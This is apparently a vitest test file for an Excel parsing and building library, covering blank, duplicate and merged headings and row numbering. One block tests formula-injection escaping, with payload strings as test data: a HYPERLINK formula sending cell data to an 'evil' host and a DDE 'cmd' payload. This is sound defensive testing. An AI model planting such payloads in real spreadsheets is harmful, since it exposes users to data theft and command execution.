import { describe, it, expect } from 'vitest';
import { buildWorkbook, duplicateHeadingIssue, loadExcelJS, parseWorkbook } from '@/lib/excel';

/**
 * N05: real ExcelJS workbooks, cell by cell, so a heading can sit in any column
 * and any column can be left blank — buildWorkbook cannot produce the sheets
 * people actually upload.
 */
async function sheetFrom(
  cells: Record<string, unknown>,
  prepare?: (ws: import('exceljs').Worksheet) => void,
  name = 'Customers'
): Promise<ArrayBuffer> {
  const ExcelJS = await loadExcelJS();
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet(name);
  for (const [addr, v] of Object.entries(cells)) ws.getCell(addr).value = v as never;
  prepare?.(ws);
  return (await wb.xlsx.writeBuffer()) as ArrayBuffer;
}

describe('lib/excel parseWorkbook — N05: every heading reads its own column', () => {
  it('a blank heading in the middle shifts nothing (the reported case: A, C, D, E with B blank)', async () => {
    const buf = await sheetFrom({
      A1: 'cust_code', C1: 'cust_name', D1: 'branch_code', E1: 'address',
      A2: 'C001', B2: 'HELPER', C2: 'Real Shop', D2: '01', E2: 'Way 12, Muscat',
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.headers).toEqual(['cust_code', 'cust_name', 'branch_code', 'address']);
    expect(sheet.rows).toEqual([
      { cust_code: 'C001', cust_name: 'Real Shop', branch_code: '01', address: 'Way 12, Muscat' },
    ]);
  });

  it('a blank LEADING heading shifts nothing either', async () => {
    const buf = await sheetFrom({
      B1: 'cust_code', C1: 'cust_name',
      A2: 'row helper', B2: 'C002', C2: 'Second Shop',
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.rows).toEqual([{ cust_code: 'C002', cust_name: 'Second Shop' }]);
  });

  it('a column with no heading is ignored, whatever it holds — it has no field to go to', async () => {
    const buf = await sheetFrom({
      A1: 'cust_code', C1: 'phone',
      A2: 'C003', B2: 99, C2: '+96891234567',
      A3: 'C004', B3: 'note to self', C3: null,
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.rows).toEqual([
      { cust_code: 'C003', phone: '+96891234567' },
      { cust_code: 'C004', phone: null },
    ]);
    for (const r of sheet.rows) expect(Object.keys(r)).not.toContain('');
  });

  it('records the same heading in two columns, case-insensitively, and the refusal names the sheet and both columns', async () => {
    // The later column used to overwrite the earlier one, blank or not: a phone
    // in C became null because F was empty.
    const buf = await sheetFrom({
      A1: 'cust_code', C1: 'phone', F1: 'PHONE ',
      A2: 'C005', C2: '+96891234567',
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.duplicateHeadings).toEqual([{ heading: 'PHONE', first: 'C', again: 'F' }]);
    expect(duplicateHeadingIssue(sheet)).toBe(
      'Sheet "Customers": the heading "PHONE" is in more than one column (C and F). Keep one, or rename the other.'
    );
    // The repeat is not read, so it cannot overwrite the first column.
    expect(sheet.headers).toEqual(['cust_code', 'phone']);
    expect(sheet.rows).toEqual([{ cust_code: 'C005', phone: '+96891234567' }]);
  });

  it('records a repeated heading on the sheet it is on, and leaves the other sheets clean', async () => {
    // Refusing the whole workbook stopped an upload over a sheet its importer
    // never reads; each caller now refuses only the sheets it reads.
    const ExcelJS = await loadExcelJS();
    const wb = new ExcelJS.Workbook();
    wb.addWorksheet('Regions').addRow(['code', 'name']);
    wb.addWorksheet('Routes').addRow(['code', 'name', 'Code']);
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const [regions, routes] = await parseWorkbook(buf);
    expect(duplicateHeadingIssue(regions)).toBeNull();
    expect(regions.duplicateHeadings).toEqual([]);
    expect(duplicateHeadingIssue(routes)).toMatch(
      /^Sheet "Routes": the heading "Code" is in more than one column \(A and C\)/
    );
  });

  it('reads a rich-text, formula or hyperlink heading as its text, not "[object Object]"', async () => {
    const buf = await sheetFrom({
      A1: { richText: [{ text: 'cust_' }, { text: 'code' }] },
      B1: { formula: 'LOWER("CUST_NAME")', result: 'cust_name' },
      C1: { text: 'address', hyperlink: 'https://example.invalid/help' },
      A2: 'C006', B2: 'Rich Shop', C2: 'Way 3',
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.headers).toEqual(['cust_code', 'cust_name', 'address']);
    expect(sheet.rows).toEqual([{ cust_code: 'C006', cust_name: 'Rich Shop', address: 'Way 3' }]);
  });

  it('a heading merged across columns is one heading, read from its first column', async () => {
    // exceljs repeats a merged cell's text in every cell of the merge; read as
    // headings, those copies would be refused as duplicates.
    const buf = await sheetFrom(
      { A1: 'Instructions', D1: 'notes', A2: 'Fill in the Customers sheet', D2: 'x' },
      (ws) => ws.mergeCells('A1:C1'),
      'Instructions'
    );
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.headers).toEqual(['Instructions', 'notes']);
    expect(sheet.rows).toEqual([{ Instructions: 'Fill in the Customers sheet', notes: 'x' }]);
  });

  it('reports each row by its Excel row number, blank lines included', async () => {
    // Callers numbered rows index + 2, so after a blank line every reported row
    // was one too low.
    const buf = await sheetFrom({
      A1: 'cust_code',
      A2: 'C007',
      A4: 'C008',
      A7: 'C009',
    });
    const [sheet] = await parseWorkbook(buf);
    expect(sheet.rows.map((r) => r.cust_code)).toEqual(['C007', 'C008', 'C009']);
    expect(sheet.rowNumbers).toEqual([2, 4, 7]);
  });
});

describe('lib/excel — formula injection escape (QA-021)', () => {
  it('escapes leading = + - @ in cell values when building a workbook', async () => {
    const wb = await buildWorkbook(
      [
        { name: '=HYPERLINK("http://evil/?x="&A1)' },
        { name: '+1+2' },
        { name: "-2+3+cmd|' /C calc'!A0" },
        { name: '@SUM(A1:A2)' },
        { name: 'Normal Shop Name' },
      ],
      'Test'
    );
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const sheets = await parseWorkbook(buf);
    const cells = sheets[0].rows.map((r) => r['name']);
    expect(cells[0]).toBe(`'=HYPERLINK("http://evil/?x="&A1)`);
    expect(cells[1]).toBe(`'+1+2`);
    expect(cells[2]).toBe(`'-2+3+cmd|' /C calc'!A0`);
    expect(cells[3]).toBe(`'@SUM(A1:A2)`);
    expect(cells[4]).toBe(`Normal Shop Name`); // unchanged
  });

  it('leaves sign-prefixed numerics alone — phones and negatives are not formulas (go-live 2026-09-10)', async () => {
    const wb = await buildWorkbook(
      [
        { v: '+96898765432' },
        { v: '+968 9876 5432' },
        { v: '+968-9876-5432' },
        { v: '-1' },
        { v: '-12.5' },
        { v: '+(968) 24 123456' },
      ],
      'Test'
    );
    const buf = (await wb.xlsx.writeBuffer()) as ArrayBuffer;
    const sheets = await parseWorkbook(buf);
    const cells = sheets[0].rows.map((r) => r['v']);
    expect(cells).toEqual([
      '+96898765432',
      '+968 9876 5432',
      '+968-9876-5432',
      '-1',
      '-12.5',
      '+(968) 24 123456',
    ]);
  });
});
